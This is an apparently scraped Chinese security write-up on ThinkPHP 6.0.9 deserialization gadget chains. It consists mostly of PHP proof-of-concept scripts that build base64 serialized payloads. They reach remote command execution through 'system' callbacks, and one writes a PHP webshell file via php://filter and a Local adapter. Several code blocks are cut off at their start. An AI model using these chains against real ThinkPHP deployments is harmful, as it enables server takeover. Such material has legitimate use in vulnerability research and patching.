        $url  = !empty($info['path']) ? $info['path'] : '';
传入一个$url="a:"利用这里把他替换为空
$this->app = 给个public的request属性的任意类
    lazySave = true;
                $this->withEvent = false;
                $this->exists = true;
                $this->table = new Url();
                $this->force = true;
                $this->data = ["1"];
            }
        }
    }
    namespace think\model {
        use think\Model;
        class Pivot extends Model
        {
            function __construct()
            {
                parent::__construct();
            }
        }
        $b = new Pivot();
        echo base64_encode(serialize($b));
    }
    namespace think\route {
        use think\Middleware;
        use think\Validate;
        class Url
        {
            protected $url;
            protected $domain;
            protected $app;
            protected $route;
            public function __construct()
            {
                $this->url = 'a:';
                $this->domain = "";
                $this->app = new Middleware();
                $this->route = new Validate();
            }
        }
    }
    namespace think {
        use think\view\driver\Php;
        class Validate
        {
            public function __construct()
            {
                $this->type['getDomainBind'] = [new Php(), 'display'];
            }
        }
        class Middleware
        {
            public function __construct()
            {
                $this->request = "2333";
            }
        }
    }
    namespace think\view\driver {
        class Php
        {
            public function __construct()
            {
            }
        }
    }
# 第二条链子
## 漏洞分析
因为在tp6.0.9中已经抛弃了6.0x反序列化我们利用的toString后面的gadget了,不过在上一条链子已经看到了师傅发掘的另外的toString链,于是和之前一样只要找到可以调用toString的点,就能进行rce
寻找其他的入口点
    vendor\league\flysystem-cached-adapter\src\Storage\AbstractCache.php
跟进save,这是一个抽象类,所以我们应该到其子类去寻找可用的save方法
    src/think/filesystem/CacheStore.php
其实我看了看另外几个save方法,就这个最简单了
$this->store可控,可以去调用任意类的set方法,没有则调用__call
这里先出发去找可用的set方法
定位到src/think/cache/driver/File.php
    public function set($name, $value, $expire = null): bool
    {
        $this->writeTimes++;
        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }
        $expire   = $this->getExpireTime($expire);
        $filename = $this->getCacheKey($name);
        $dir = dirname($filename);
        if (!is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }
        $data = $this->serialize($value);
        if ($this->options['data_compress'] && function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }
        $data   = "\n" . $data;
        $result = file_put_contents($filename, $data);
        if ($result) {
            clearstatcache();
            return true;
        }
        return false;
    }
跟进getExpireTime
发现没什么可用的
跟进getCacheKey
这里其实就是为了查看进入该方法是否出现错误或者直接return了
所以这里$this->options['hash_type']不能为空
返回了一个字符拼接的值,$this->options['path']可控,又可以去调用上一条链子的__toString
## 漏洞复现
    autosave = false;
            }
        }
    }
    namespace think\filesystem {
        use League\Flysystem\Cached\Storage\AbstractCache;
        use think\cache\driver\File;
        class CacheStore extends AbstractCache
        {
            protected $store;
            protected $expire;
            protected $key;
            public function __construct()
            {
                $this->store = new File();
                $this->expire = 1;
                $this->key = '1';
            }
        }
        echo base64_encode(serialize(new CacheStore()));
    }
    namespace think\cache {
        use think\route\Url;
        abstract class Driver
        {
            protected $options = [
                'expire' => 0,
                'cache_subdir' => true,
                'prefix' => '',
                'path' => '',
                'hash_type' => 'md5',
                'data_compress' => false,
                'tag_prefix' => 'tag:',
                'serialize' => ['system'],
            ];
            public function __construct()
            {
                $this->options = [
                    'expire' => 0,
                    'cache_subdir' => true,
                    'prefix' => '',
                    'path' => new Url(),
                    'hash_type' => 'md5',
                    'data_compress' => false,
                    'tag_prefix' => 'tag:',
                    'serialize' => ['system'],
                ];
            }
        }
    }
    namespace think\cache\driver {
        use think\cache\Driver;
        class File extends Driver
        {
        }
    }
    namespace think\route {
        use think\Middleware;
        use think\Validate;
        class Url
        {
            protected $url;
            protected $domain;
            protected $app;
            protected $route;
            public function __construct()
            {
                $this->url = 'a:';
                $this->domain = "";
                $this->app = new Middleware();
                $this->route = new Validate();
            }
        }
    }
    namespace think {
        use think\view\driver\Php;
        class Validate
        {
            public function __construct()
            {
                $this->type['getDomainBind'] = [new Php(), 'display'];
            }
        }
        class Middleware
        {
            public function __construct()
            {
                $this->request = "2333";
            }
        }
    }
    namespace think\view\driver {
        class Php
        {
            public function __construct()
            {
            }
        }
    }
# 第三条链子
POC
    store = new File();
            }
        }
        echo base64_encode(serialize(new CacheStore()));
    }
    namespace think\cache {
        abstract class Driver
        {
        }
    }
    namespace think\cache\driver {
        use think\cache\Driver;
        class File extends Driver
        {
            protected $options = [
                'expire'        => 0,
                'cache_subdir'  => true,
                'prefix'        => '',
                'path'          => '',
                'hash_type'     => 'md5',
                'data_compress' => false,
                'tag_prefix'    => 'tag:',
                'serialize'     => ['system'],
            ];
        }
    }
# 第四条链子
POC
    store = new File();
            }
        }
        echo base64_encode(serialize(new CacheStore()));
    }
    namespace think\cache {
        abstract class Driver
        {
        }
    }
    namespace think\cache\driver {
        use think\cache\Driver;
        class File extends Driver
        {
            protected $options = [
                'expire'        => 1,
                'cache_subdir'  => false,
                'prefix'        => false,
                'path'          => 'php://filter/write=convert.base64-decode/resource=',
                'hash_type'     => 'md5',
                'data_compress' => false,
                'tag_prefix'    => 'tag:',
                'serialize'     => ['trim']
            ];
        }
    }
# 第五条链子
POC
    '];
    }
    namespace League\Flysystem\Cached\Storage;
    class Adapter extends AbstractCache
    {
        protected $adapter;
        protected $file;
        public function __construct($obj)
        {
            $this->adapter = $obj;
            $this->file = 'DawnT0wn.php';
        }
    }
    namespace League\Flysystem\Adapter;
    abstract class AbstractAdapter
    {
    }
    namespace League\Flysystem\Adapter;
    use League\Flysystem\Cached\Storage\Adapter;
    use League\Flysystem\Config;
    class Local extends AbstractAdapter
    {
        public function has($path)
        {
        }
        public function write($path, $contents, Config $config)
        {
        }
    }
    $a = new Local();
    $b = new Adapter($a);
    echo base64_encode(serialize($b));
之前复现过6.0x的thinkphp反序列化,后面三条链子并没有修,还是能够打通的,就没有写分析了这里主要是去复现了新的toString的Gadget,触发点还是有几个,这里没有写完,只要找到操作可控字符串的点就能触发
后三条链的具体的分析可以到
参考链接